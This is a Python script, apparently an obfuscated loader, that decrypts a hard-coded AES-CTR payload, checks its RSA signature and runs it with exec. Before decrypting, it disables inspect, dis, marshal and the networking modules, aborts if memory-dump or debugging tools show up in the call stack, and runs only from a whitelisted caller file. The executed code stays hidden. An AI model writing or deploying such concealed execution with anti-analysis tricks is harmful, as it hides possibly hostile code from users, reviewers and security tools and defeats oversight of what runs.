
ᅠ = (lambda: vars(__builtins__)["".join(chr(i) for i in [95,95,105,109,112,111,114,116,95,95])])()
inspect = ᅠ("".join(chr(i) for i in [105,110,115,112,101,99,116]))
_real_inspect = __import__("".join(map(chr,[105,110,115,112,101,99,116])))
base64 = ᅠ("".join(chr(i) for i in [98,97,115,101,54,52]))
AES = getattr(ᅠ("".join(chr(i) for i in [67,114,121,112,116,111,100,111,109,101,46,67,105,112,104,101,114]), fromlist=["AES"]), "AES")
RSA = getattr(ᅠ("".join(chr(i) for i in [67,114,121,112,116,111,100,111,109,101,46,80,117,98,108,105,99,75,101,121]), fromlist=["RSA"]), "RSA")

key = base64.b64decode(b'2WzjiCXRssDcDBh2x44erdcXgGI4BV+srDOdHpilXRs=')
nonce = base64.b64decode(b'nPnk0nXDju4=')
ciphertext = base64.b64decode(b'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')
signature = base64.b64decode(b'Qh0XC9nhvd1bItDaIZX82plnhFrmeJd+oeaV3wUOFOS2gSBBxIJmFiZ654iCvxswONs72w4aEICKdKrPnz+OqHfEijhdUYcDw+2ka5PE4yr4+G0UNV2IIFinG1JXhUw24dxxn0TsMzbIzYUPsCHJc95gP5Mak3VW34NcXxulD2sDzsl40ZXUxZ0pj7kzqSjQqqI2jz9kQsDofIPjcaDh6b7NulZNUDvthVhAbNWR5x5z8CuiUA87/UUkQTqDDvt6Wdfn/ldyotdkkIovJpOyTaszrIYJDqPkk6sY2Ve12Uehyuv4jTs3Ce1lRo4he56XzUvqdR2hyF0xpuiy98/pktrN2qMtTintMRuKb50Awf8UGfXqBn7zJW5ozNmjbnVadnZFqkNMSPRiBm9lVTpzEtDnOWGzqXnijfZ/IKu8B90flWMjFrTMc+FqCJi2tdun707dOF6tFXXF6E03nwB8ju3LExx4UBUBG6lJdlpc17SRdTCndkvx/2mw7eg3y1Dk')
public_key = RSA.import_key(base64.b64decode(b'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQm9qQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FZOEFNSUlCaWdLQ0FZRUF3ZXdDT3o2SzJmZml2dEMxditjRApyaVBJZDJYZWh5d0drUHJxR1pubzlManZkRE1yL3VmWXZOSmxNdnFUK3Uwd3RyZjlueVRNemxiOVg0OTdSWDdGCldJSFgyd0x1UVJUbWRNTGZnNXh3MDdFUGZxcWpVU09LamlBbWN5eXVZazcxUXdXSnl0Zk4zUURqVW1ONGNuS24KNWZzTDhLdDRqcUlKY0hOSVZvZGsyc2RHZUdCWE8yOUNkdXAySE9sNU9TMVVlK2wxMXVJVzN1VlI5Mm1Ua3ZESQpET1pJN0JCYTNTV2RiVXJ1UUJwMlVMNzlmM3hMWHg4UDl0VFRJYW02d2RQWDYyMTl5NVlnS0tUR2FjNWNmYWVBCnh4cFlTeCtzbEhCVUJNamJrSzFIdGdlYWtNZG1Ga3BPeEpObTJVMy9oMit6TkFCRm4wTjlFdDV6cHJ5UE5BZG8KZ0VSUGlSV1RFK3ZscFpxTys0NDFSRkwxQ0taTGVtbmVPT1MwclJwOVgvZlA5aDE3SUF2RGM2VXh4VTJMNjNqTAoyWkR5dVV5MSs3a0txbEtOV0dLbHA2eWRXeFVGaWxTaWR1bkd1ZTJZaGhZS3ZENlM5V3RsWU95eGl6MlJsZEhKClhtTTBoT1VwelB4Vml1bzlkRG1jR3hPVEhoLzk5QmZ6dEYyWFdCUkk1U1h4QWdNQkFBRT0KLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'))

zezoire = (lambda names: (lambda code: (__import__("builtins").exec(code, __import__("builtins").globals()) if names[0] not in _real_inspect.currentframe().f_code.co_names else (_ for _ in ()).throw(MemoryError("Tamper")))))(["".join(chr(i) for i in [112,114,105,110,116]),"".join(chr(i) for i in [101,120,101,99]),"".join(chr(i) for i in [103,108,111,98,97,108,115])])

# ===== Anti-hook, Anti-dump & Verify =====
_sys = __import__("".join(map(chr,[115,121,115])))

_block_list = [
    "".join(map(chr,[105,110,115,112,101,99,116])),
    "".join(map(chr,[100,105,115])),
    "".join(map(chr,[109,97,114,115,104,97,108])),
    "".join(map(chr,[114,101,113,117,101,115,116,115])),
    "".join(map(chr,[104,116,116,112])),
    "".join(map(chr,[104,116,116,112,46,99,108,105,101,110,116])),
    "".join(map(chr,[117,114,108,108,105,98])),
    "".join(map(chr,[115,111,99,107,101,116]))
]

_orig_modules = {m: _sys.modules.get(m) for m in _block_list}

_err_block = "".join(map(chr,[72,84,84,80,47,72,111,111,107,32,68,101,116,101,99,116,101,100]))
_err_builtin = "".join(map(chr,[78,111,116,32,111,114,105,103,105,110,97,108,32,98,117,105,108,116,105,110,115]))
_err_caller = "".join(map(chr,[85,110,97,117,116,104,111,114,105,122,101,100,32,99,97,108,108,101,114]))
_err_dump = "".join(map(chr,[68,117,109,112,32,100,101,116,101,99,116,101,100]))

_Block = type("".join(map(chr,[95,66,108,111,99,107])),(),{
    "__getattr__": (lambda self,name: (_ for _ in ()).throw(MemoryError(_err_block))),
    "__call__": (lambda self,*a,**k: (_ for _ in ()).throw(MemoryError(_err_block)))
})

try:
    for m in _block_list:
        _sys.modules[m] = _Block()

    _blt = __builtins__ if isinstance(__builtins__, dict) else vars(__builtins__)
    _se = eval("".join(map(chr,[101,120,101,99])))
    _si = eval("".join(map(chr,[95,95,105,109,112,111,114,116,95,95])))
    _so = eval("".join(map(chr,[111,112,101,110])))

    (lambda: (
        (_ for _ in ()).throw(MemoryError(_err_builtin))
        if eval("".join(map(chr,[101,120,101,99]))) is not _se or
           eval("".join(map(chr,[95,95,105,109,112,111,114,116,95,95]))) is not _si or
           eval("".join(map(chr,[111,112,101,110]))) is not _so else None
    ))()

    # ==== Anti-dump memory ====
    _bad = [
        ''.join([chr(c) for c in [116,114,97,99,101,109,97,108,108,111,99]]),
        ''.join([chr(c) for c in [112,105,99,107,108,101]]),
        ''.join([chr(c) for c in [100,105,108,108]]),
        ''.join([chr(c) for c in [103,99]]),
        ''.join([chr(c) for c in [103,101,116,115,111,117,114,99,101]])
    ]
    for _f in _real_inspect.stack():
        if any(b in str(_f).lower() for b in _bad):
            raise MemoryError(_err_dump)

    # ==== Check caller file (hidden whitelist) ====
    _caller = (lambda f: (f[1].filename if len(f) > 1 else f[0].filename))(_real_inspect.stack())
    _allowed = [
        "".join(map(chr,[115, 101, 114, 118, 101, 114, 50, 48, 53, 46, 112, 121])),
        "".join(map(chr,[60,115,116,100,105,110,62]))
    ]
    if not any(ok in str(_caller) for ok in _allowed):
        raise MemoryError(_err_caller)

    # ==== Giải mã (AES-CTR) ====
    _decrypted = (
        lambda M, K, N, C: getattr(
            __import__(M, fromlist=[K]),
            "".join(map(chr,[110,101,119]))  # "new"
        )(
            key,
            getattr(
                __import__(M, fromlist=[K]),
                "".join(map(chr,[77,79,68,69,95,67,84,82]))  # "MODE_CTR"
            ),
            **{ "".join(map(chr,[110,111,110,99,101])): N }  # "nonce"
        ).__getattribute__(
            "".join(map(chr,[100,101,99,114,121,112,116]))  # "decrypt"
        )(C)
    )(
        "".join(map(chr,[67,114,121,112,116,111,100,111,109,101,46,67,105,112,104,101,114,46,65,69,83])),  # "Cryptodome.Cipher.AES"
        "".join(map(chr,[65,69,83])),  # "AES"
        nonce,
        ciphertext
    )

    # ==== Verify chữ ký (RSA-PSS) ====
    (lambda v: True)(
        getattr(
            __import__("".join(map(chr,[67,114,121,112,116,111,100,111,109,101,46,83,105,103,110,97,116,117,114,101,46,112,115,115])),fromlist=["x"]),
            "".join(map(chr,[110,101,119]))
        )(public_key).verify(
            getattr(
                __import__("".join(map(chr,[67,114,121,112,116,111,100,111,109,101,46,72,97,115,104,46,83,72,65,50,53,54])),fromlist=["x"]),
                "".join(map(chr,[110,101,119]))
            )(_decrypted),
            signature
        )
    )
    _plaintext_bytes = _decrypted

finally:
    for m, v in _orig_modules.items():
        if v is None:
            _sys.modules.pop(m, None)
        else:
            _sys.modules[m] = v

# execute decrypted code
zezoire(_plaintext_bytes.decode())
